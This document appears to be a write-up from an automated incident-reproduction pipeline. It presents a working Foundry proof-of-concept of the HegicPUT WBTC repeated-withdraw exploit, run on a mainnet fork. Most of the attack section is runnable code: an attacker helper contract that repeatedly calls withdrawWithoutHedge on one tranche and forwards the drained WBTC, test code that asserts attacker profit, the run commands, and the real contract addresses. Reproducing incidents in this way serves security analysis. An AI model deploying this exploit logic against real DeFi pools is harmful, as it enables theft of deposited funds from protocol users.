# HegicPUT WBTC Repeated-Withdraw Exploit PoC

## 1. Overview & Context

This proof-of-concept (PoC) reproduces the HegicPUT WBTC pool exploit on an Ethereum mainnet fork. In the original incident, an attacker used a helper contract to create a tiny WBTC liquidity tranche and then repeatedly called `withdrawWithoutHedge` on the same tranche ID, draining significantly more WBTC from the pool than the original deposit.

The PoC:
- Forks Ethereum mainnet at a pre-incident block.
- Interacts directly with the real HegicPUT WBTC pool and WBTC token.
- Deploys a local helper contract that mirrors the attacker’s behavior.
- Demonstrates repeated successful withdrawals on a single tranche and net WBTC profit for the attacker while depleting the victim pool.

**Command to run the PoC:**

```bash
cd forge_poc
RPC_URL="<mainnet_quicknode_url>" forge test --via-ir -vvvvv
```

In the validation run, `RPC_URL` was set using the QuickNode template for chain ID 1 and the `.env` secrets, and all tests passed.

## 2. PoC Architecture & Key Contracts

### Core On-Chain Components

- **HegicPUT WBTC Pool (`IHegicPool`)**  
  - Address: `0x7094E706E75E13D1E0ea237f71A7C4511e9d270B`.  
  - Role: Manages WBTC liquidity tranches and exposes the vulnerable `withdrawWithoutHedge(uint256 trancheID)` function.

- **WBTC Token (`IERC20`)**  
  - Address: `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`.  
  - Role: Underlying collateral token; all balances, deposits, and withdrawals are denominated in WBTC.

These contracts are accessed via minimal interfaces in `src/HegicInterfaces.sol` and are not mocked.

```solidity
// Origin: src/HegicInterfaces.sol
interface IHegicPool {
    function provideFrom(
        address account,
        uint256 amount,
        bool hedged,
        uint256 minShare
    ) external returns (uint256 share);

    function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount);
    function ownerOf(uint256 trancheID) external view returns (address);
    function lockupPeriod() external view returns (uint256);
    function maxDepositAmount() external view returns (uint256);
    function totalBalance() external view returns (uint256);
}
```

*Snippet: Minimal HegicPUT pool interface used by the PoC to interact with the real mainnet contract.*

### Adversary and Helper Contracts

- **Attacker EOA (`attacker`)**  
  - Derived via `makeAddr("attacker")` in Foundry.  
  - Represents a fresh adversary address (not the real incident EOA).

- **`AttackerHelper` Contract** (`src/AttackerHelper.sol`)  
  - Deployed in `setUp()` against the real HegicPUT pool and WBTC token.  
  - Responsibilities:
    - Create a new liquidity tranche owned by the helper using `provideFrom`.
    - Capture the minted tranche ID via `onERC721Received`.
    - Call `withdrawWithoutHedge(trancheId)` repeatedly to drain WBTC.  
    - Forward all WBTC to the attacker EOA at the end.

```solidity
// Origin: src/AttackerHelper.sol
contract AttackerHelper {
    IHegicPool public immutable pool;
    IERC20 public immutable wbtc;

    uint256 public trancheId;

    constructor(IHegicPool _pool, IERC20 _wbtc) {
        pool = _pool;
        wbtc = _wbtc;
    }

    function createTranche(uint256 amount) external {
        wbtc.approve(address(pool), amount);
        pool.provideFrom(address(this), amount, false, 0);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        trancheId = tokenId;
        return this.onERC721Received.selector;
    }

    function withdrawOnce() external {
        pool.withdrawWithoutHedge(trancheId);
    }

    function withdrawMany(uint256 iterations) external {
        for (uint256 i = 0; i < iterations; i++) {
            pool.withdrawWithoutHedge(trancheId);
        }
    }

    function sendToAttacker(address attacker) external {
        uint256 balance = wbtc.balanceOf(address(this));
        wbtc.transfer(attacker, balance);
    }
}
```

*Snippet: Local helper contract mirroring the real incident helper behavior for tranche creation, repeated withdrawal, and profit forwarding.*

## 3. Adversary Execution Flow

The main exploit logic is implemented in `test/Exploit.t.sol` within the `HegicPutExploitTest` contract.

### 3.1 Environment Setup and Funding

In `setUp()`, the test forks Ethereum mainnet, instantiates roles, and prepares a small WBTC-backed tranche:

```solidity
// Origin: test/Exploit.t.sol, setUp()
string memory rpcUrl = vm.envString("RPC_URL");
uint256 forkBlockNumber = 21_691_131;
vm.createSelectFork(rpcUrl, forkBlockNumber);

attacker = makeAddr("attacker");

vm.label(attacker, "Attacker EOA");
vm.label(address(HEGIC_PUT_POOL), "HegicPUT WBTC Pool");
vm.label(address(WBTC), "WBTC");

attackerHelper = new AttackerHelper(HEGIC_PUT_POOL, WBTC);
vm.label(address(attackerHelper), "Attacker Helper");
```

*Snippet: Mainnet fork creation and role labeling for the PoC environment.*

Key steps:
- **Fork selection**: Uses `vm.createSelectFork` with `RPC_URL` and a pre-incident block (`21_691_131`), ensuring realistic HegicPUT and WBTC state.
- **Roles**: Creates a fresh attacker EOA and deploys the local `AttackerHelper` contract; both are labeled for clarity in traces.

The test enforces an oracle pre-check on pool liquidity and sets up a small WBTC deposit:

```solidity
// Origin: test/Exploit.t.sol, setUp()
uint256 poolBalanceBefore = WBTC.balanceOf(address(HEGIC_PUT_POOL));
uint256 minPoolLiquidity = 1e5; // 0.001 WBTC in 8 decimals
assertGe(poolBalanceBefore, minPoolLiquidity, "pool must have initial WBTC liquidity");

uint256 limit = HEGIC_PUT_POOL.maxDepositAmount() - HEGIC_PUT_POOL.totalBalance();
uint256 desiredDeposit = 1e5; // 0.001 WBTC in 8 decimals
require(limit >= desiredDeposit, "no capacity left in pool");

depositAmount = desiredDeposit;

deal(address(WBTC), address(attackerHelper), depositAmount);
attackerHelper.createTranche(depositAmount);
trancheId = attackerHelper.trancheId();

assertEq(
    HEGIC_PUT_POOL.ownerOf(trancheId),
    address(attackerHelper),
    "helper must own the exploited tranche"
);

uint256 lockup = HEGIC_PUT_POOL.lockupPeriod();
vm.warp(block.timestamp + lockup + 1);
```

*Snippet: Environment setup capturing initial pool liquidity, tranche creation, tranche ownership, and lockup period handling.*

Summary of setup:
- **Funding**: Uses `deal` to allocate `depositAmount` (0.001 WBTC) to the helper, emulating the real swap-based funding without relying on the attacker’s actual transactions.
- **Tranche creation**: `AttackerHelper.createTranche` calls `provideFrom`, and `onERC721Received` records `trancheId`.
- **Pre-checks**: Enforces non-trivial pool WBTC balance and verifies helper ownership of the tranche.
- **Lockup**: Advances time beyond `lockupPeriod` to satisfy withdrawal conditions.

### 3.2 Exploit Execution

The exploit itself is executed in `testExploit()`:

```solidity
// Origin: test/Exploit.t.sol, testExploit()
uint256 attackerBefore = WBTC.balanceOf(attacker);
uint256 poolBefore = WBTC.balanceOf(address(HEGIC_PUT_POOL));
uint256 helperClusterBefore =
    WBTC.balanceOf(address(attackerHelper)) + attackerBefore;

uint256 helperBefore = WBTC.balanceOf(address(attackerHelper));

// First withdrawal on the tranche.
attackerHelper.withdrawOnce();
uint256 helperAfterFirst = WBTC.balanceOf(address(attackerHelper));

// Second withdrawal on the same tranche ID must also succeed.
attackerHelper.withdrawOnce();
uint256 helperAfterSecond = WBTC.balanceOf(address(attackerHelper));

assertGt(
    helperAfterFirst,
    helperBefore,
    "first withdraw must transfer WBTC to helper"
);
assertGt(
    helperAfterSecond,
    helperAfterFirst,
    "second withdraw on same tranche must also transfer WBTC"
);

attackerHelper.withdrawMany(8);

attackerHelper.sendToAttacker(attacker);

uint256 attackerAfter = WBTC.balanceOf(attacker);
uint256 poolAfter = WBTC.balanceOf(address(HEGIC_PUT_POOL));
uint256 helperClusterAfter =
    WBTC.balanceOf(address(attackerHelper)) + attackerAfter;
```

*Snippet: Core exploit sequence demonstrating repeated `withdrawWithoutHedge` calls on a single tranche and profit realization for the attacker.*

Flow:
1. Record baseline balances for the attacker, pool, and helper cluster.  
2. Perform a **first** `withdrawWithoutHedge(trancheId)` via `withdrawOnce()`, confirming WBTC is transferred from the pool to the helper.  
3. Perform a **second** `withdrawWithoutHedge(trancheId)` on the same tranche and assert that an additional WBTC transfer occurs.  
4. Execute several more withdrawals via `withdrawMany(8)` to amplify the over-withdrawal effect.  
5. Call `sendToAttacker(attacker)` to transfer all helper-held WBTC to the attacker EOA.

### 3.3 Profit Realization and Victim Loss

The test concludes by checking attacker profit and pool depletion:

```solidity
// Origin: test/Exploit.t.sol, testExploit()
IERC20 profitToken = WBTC;
assertEq(
    address(profitToken),
    address(WBTC),
    "exploit profit must be denominated in WBTC"
);

assertGt(
    attackerAfter,
    attackerBefore,
    "attacker EOA must have strictly more WBTC after exploit"
);

assertLt(
    poolAfter,
    poolBefore,
    "HegicPUT WBTC pool must lose WBTC during exploit"
);

uint256 withdrawn = helperClusterAfter - helperClusterBefore;
assertGt(
    withdrawn,
    depositAmount,
    "total WBTC withdrawn must exceed original deposit"
);
```

*Snippet: Assertions verifying that the attacker profits in WBTC, the pool loses WBTC, and the total WBTC withdrawn exceeds the initial deposit.*

These assertions show:
- The profit asset is WBTC.  
- The attacker’s WBTC balance is strictly higher post-exploit.  
- The HegicPUT pool’s WBTC balance is strictly lower.  
- The aggregate withdrawn WBTC exceeds the initial deposit, capturing over-withdrawal.

## 4. Oracle Definitions and Checks

The PoC is guided by `oracle_definition.json`, which defines variables, pre-checks, and both hard and soft constraints.

### 4.1 Variables

From the oracle definition:

```json
{
  "variables": [
    { "name": "attacker", "role": "Attacker" },
    { "name": "attacker_helper", "role": "Attacker" },
    { "name": "hegic_put_pool", "address": "0x7094E7...270B" },
    { "name": "wbtc", "address": "0x2260FA...C599", "symbol": "WBTC" }
  ]
}
```

*Snippet: Extract of oracle variables describing attacker entities and the HegicPUT/WBTC contracts.*

Implementation mapping:
- `attacker` → `address attacker = makeAddr("attacker");`
- `attacker_helper` → `AttackerHelper attackerHelper` (deployed in `setUp()`).
- `hegic_put_pool` → `IHegicPool internal constant HEGIC_PUT_POOL = IHegicPool(0x7094E7…270B);`
- `wbtc` → `IERC20 internal constant WBTC = IERC20(0x2260FA…C599);`

### 4.2 Pre-checks

The oracle pre-checks require:
1. The HegicPUT WBTC pool must start with non-trivial WBTC liquidity.  
2. The attacker helper must own a fresh tranche NFT after setup.

Both are implemented in `setUp()`:
- **Pool liquidity pre-check**: `assertGe(poolBalanceBefore, minPoolLiquidity, ...)` with `minPoolLiquidity = 1e5` (0.001 WBTC).  
- **Tranche ownership pre-check**: `assertEq(HEGIC_PUT_POOL.ownerOf(trancheId), address(attackerHelper), ...)`.

These align directly with the provided assertions in the oracle definition.

### 4.3 Hard Constraints

The hard oracles specify conditions that must hold in all valid PoCs.

1. **Asset type (WBTC)**  
   - Oracle: `profitToken` must equal `wbtc` address.  
   - Implementation: `IERC20 profitToken = WBTC; assertEq(address(profitToken), address(WBTC), ...)`.

2. **Repeated withdrawal behavior**  
   - Oracle: Calling `withdrawWithoutHedge` twice on the same tranche must succeed and transfer WBTC both times.  
   - Implementation: Two `withdrawOnce()` calls followed by `assertGt` checks on `helperAfterFirst` and `helperAfterSecond`.

These hard constraints are fully encoded in the test and are exercised during `testExploit()`.

### 4.4 Soft Constraints

The soft oracles focus on economic effects and invariants.

1. **Attacker WBTC profit**  
   - Oracle: Attacker EOA must end with strictly more WBTC than it started.  
   - Implementation: `assertGt(attackerAfter, attackerBefore, ...)`.

2. **Victim pool depletion**  
   - Oracle: HegicPUT pool must lose WBTC.  
   - Implementation: `assertLt(poolAfter, poolBefore, ...)`.

3. **Over-withdraw relative to deposit**  
   - Oracle: Total WBTC withdrawn for the exploited tranche must exceed the original deposit amount.  
   - Implementation: `withdrawn = helperClusterAfter - helperClusterBefore; assertGt(withdrawn, depositAmount, ...)`.

The PoC uses a smaller deposit and a modest number of iterations compared with the real incident, but maintains the invariant that the attacker cluster’s net WBTC inflow exceeds the initial WBTC injected into the exploited tranche.

## 5. Validation Result and Robustness

The validator executed the PoC with:

```bash
cd /home/ziyue/TxRayExperiment/incident-202512271738/forge_poc
RPC_URL="https://<quicknode_name>.quiknode.pro/<token>" forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512271738/artifacts/poc/poc_validator/forge-test.log 2>&1
```

All tests passed. The tail of the trace shows repeated `withdrawWithoutHedge(2)` calls from the HegicPUT pool to the Attacker Helper and a final `sendToAttacker` transfer to the attacker EOA, consistent with the exploit scenario.

The validator’s structured result is stored at:
- `artifacts/poc/poc_validator/poc_validated_result.json`

Key summary from that result:
- `overall_status`: **Pass**.  
- Validation oracles: **passed** — all pre-checks, hard constraints, and soft constraints are implemented and satisfied on a mainnet fork.  
- PoC quality checks: **passed** across oracle alignment, readability/labeling, absence of magic numbers, correct use of mainnet fork with no mocks, self-contained attacker modeling, end-to-end ACT description, and alignment with the documented root cause.

Robustness considerations:
- The PoC relies only on the WBTC and HegicPUT contracts’ live mainnet state at a fixed block, reducing brittleness from changing on-chain conditions.  
- Deposit amount and withdraw iteration counts are deliberately modest to keep gas usage reasonable while still satisfying all oracles.

## 6. Linking PoC Behavior to Root Cause

The root cause report concludes that the vulnerability arises from a missing tranche state guard in HegicPUT’s internal `_withdraw` function, which allows multiple withdrawals from the same tranche after the lockup period.

### 6.1 Exercising the Vulnerable Logic

In production, HegicPUT contains:

```solidity
// Origin: collected HegicPool source (root cause artifacts)
function withdrawWithoutHedge(uint256 trancheID)
    external
    nonReentrant
    returns (uint256 amount)
{
    address owner = ownerOf(trancheID);
    amount = _withdraw(owner, trancheID);
}

function _withdraw(address owner, uint256 trancheID)
    internal
    returns (uint256 amount)
{
    Tranche storage t = tranches[trancheID];
    // require(t.state == TrancheState.Open);
    // ... compute amount and transfer token ...
}
```

*Snippet: Vulnerable pattern from the root cause analysis showing the commented-out state check.*

The PoC’s repeated calls to `pool.withdrawWithoutHedge(trancheId)` through `AttackerHelper.withdrawOnce()` and `withdrawMany()` directly exercise this logic on the real contract, demonstrating that:
- The tranche can be withdrawn multiple times.  
- Each call recomputes a positive withdrawal amount.  
- The pool’s WBTC reserves are steadily drained.

### 6.2 Evidence of Victim Loss and Attacker Gain

The PoC ties these behaviors to concrete balance changes:
- `poolBefore` vs. `poolAfter` show that the pool loses WBTC during the exploit.  
- `attackerBefore` vs. `attackerAfter` show that the attacker EOA gains WBTC.  
- `withdrawn > depositAmount` demonstrates over-withdrawal relative to the initial liquidity position, reflecting the core economic invariant violation described in the root cause report.

### 6.3 ACT Framing

Under the ACT perspective:
- **A (Adversary actions)**: The attacker (via `AttackerHelper`) deposits a small WBTC amount, waits out the lockup, and repeatedly calls `withdrawWithoutHedge` on the same tranche.  
- **C (Contract behavior)**: The HegicPUT pool, missing a closed-state guard, treats each call as a fresh eligible withdrawal, transferring WBTC every time.  
- **T (Target outcome)**: The attacker’s cluster ends with strictly higher WBTC while the pool’s WBTC is depleted, satisfying the profit and victim-loss oracles.

The PoC therefore provides a clear, reproducible, and self-contained demonstration of the root cause in action and aligns with both the structured oracles and the narrative root cause report.
